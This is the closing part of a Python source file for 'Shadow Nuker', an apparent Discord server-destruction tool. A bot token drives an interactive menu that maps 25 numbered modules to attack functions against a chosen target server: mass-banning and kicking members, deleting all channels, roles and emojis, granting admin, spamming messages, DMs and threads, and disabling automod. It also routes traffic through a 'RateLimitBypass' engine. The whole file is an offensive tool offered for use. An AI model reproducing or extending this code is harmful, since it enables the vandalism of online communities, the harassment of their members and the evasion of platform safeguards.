        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating threads", total=len(targets))
        await run_pool(create_thread, targets, progress, task, limit=75)
        
    print_results(stats)

# ─── Attack Router ──────────────────────────────────────────────────────────

ATTACK_MAP = {
    "1": attack_dm_everyone,
    "2": attack_role_spam,
    "3": attack_delete_all_roles,
    "4": attack_give_admin,
    "5": attack_notification_all,
    "6": attack_delete_all_channels,
    "7": attack_spam_channels,
    "8": attack_spam_categories,
    "9": attack_spam_messages,
    "10": attack_kick_everyone,
    "11": attack_ban_everyone,
    "12": attack_unban_everyone,
    "13": attack_server_name,
    "14": attack_server_picture,
    "15": attack_delete_emojis,
    "16": attack_spam_emojis,
    "17": attack_delete_soundboard,
    "18": attack_spam_soundboard,
    "19": attack_delete_invites,
    "20": attack_spam_invites,
    "21": attack_pause_invites,
    "22": attack_deactivate_automod,
    "23": attack_deactivate_community,
    "24": attack_activate_community,
    "25": attack_thread_spam,
}

# ─── Main Entry Point ───────────────────────────────────────────────────────

async def exit_shadow(bot_client):
    console.print()
    console.print(Panel("[bold #ff0055]💀 Exiting Shadow Nuker... Goodbye. 💀[/]", box=DOUBLE, border_style="#ff0055"))
    console.print()
    if engine:
        await engine.close()
    try:
        await bot_client.close()
    except Exception:
        pass
    sys.exit(0)

async def bot_interactive_loop(bot_client):
    global TARGET_SERVER_ID, engine
    
    engine = RateLimitBypass(TOKEN)
    await engine.init_session()
    
    try:
        TARGET_SERVER_ID = await get_target_server_async()
    except ShadowExit:
        await exit_shadow(bot_client)
        return

    while True:
        clear_screen()
        # Snappy menu animation
        sys.stdout.reconfigure(encoding='utf-8')
        with Live(console=console, refresh_per_second=20, transient=True) as live:
            for x in range(5):
                live.update(Align.center(render_gradient_banner(x * 0.4)))
                await asyncio.sleep(0.04)
        print_static_banner()
        print_login_success(bot_client.user.name)
        
        server_stats = await fetch_server_stats(engine, TARGET_SERVER_ID)
        if server_stats:
            stats_table = Table(box=DOUBLE, border_style="#b026ff", expand=True)
            stats_table.add_column("🎯 Target Server Info", style="bold #00f0ff")
            stats_table.add_column("📊 Server Statistics", style="bold #00f0ff")
            
            stats_table.add_row(
                f"[bold white]Name:[/] {server_stats['name']}\n[bold white]ID:[/] {TARGET_SERVER_ID}",
                f"[bold white]Members:[/] {server_stats['members']}\n[bold white]Channels:[/] {server_stats['channels']}  │  [bold white]Roles:[/] {server_stats['roles']}"
            )
            console.print(Align.center(stats_table))
        else:
            console.print(Align.center(Panel(f"[bold #ff0055]⚠️ Server not found or unauthorized: {TARGET_SERVER_ID}[/]", border_style="#ff0055")))
            
        show_menu()
        
        try:
            while True:
                option = await async_ask("[bold #00f0ff]#[shadow.prompt] Select module (R to refresh, 99/ESC to exit)[/]")
                option = option.strip().lower()

                if option in ("99", "exit", "quit", "esc", "escape"):
                    await exit_shadow(bot_client)
                    return
                elif option == "r":
                    break # breaks inner loop to redraw the menu
                elif not option:
                    continue # ignore empty presses (like Ctrl sending empty or Enter)
                elif option in ATTACK_MAP:
                    console.print()
                    console.print(Rule(f"[bold #00f0ff]Executing Module {option}[/]", style="#b026ff"))
                    try:
                        await ATTACK_MAP[option](bot_client)
                    except ShadowExit:
                        await exit_shadow(bot_client)
                        return
                    await asyncio.sleep(1)
                    break # breaks inner loop to redraw menu after attack finishes
                else:
                    print_error("Invalid option. Type 'R' to refresh.")
        except ShadowExit:
            await exit_shadow(bot_client)
            return

async def main():
    await animate_banner()
    
    global TOKEN
    TOKEN = get_token_input()
    
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.messages = True

    bot_client = discord.Client(intents=intents)
    loop_started = False

    @bot_client.event
    async def on_ready():
        nonlocal loop_started
        if not loop_started:
            loop_started = True
            clear_screen()
            print_static_banner()
            print_login_success(bot_client.user.name)
            asyncio.create_task(bot_interactive_loop(bot_client))

    try:
        await bot_client.start(TOKEN)
    except discord.LoginFailure:
        print_error("Invalid Token Provided.")
        sys.exit(1)

if __name__ == "__main__":
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())  # type: ignore
        asyncio.run(main())
    except (KeyboardInterrupt, EOFError, ShadowExit):
        console.print()
        console.print(Panel("[bold #f87171]EXITING....     By Shadow Nuker [/]", box=DOUBLE, border_style="red"))
        console.print()
        sys.exit(0)
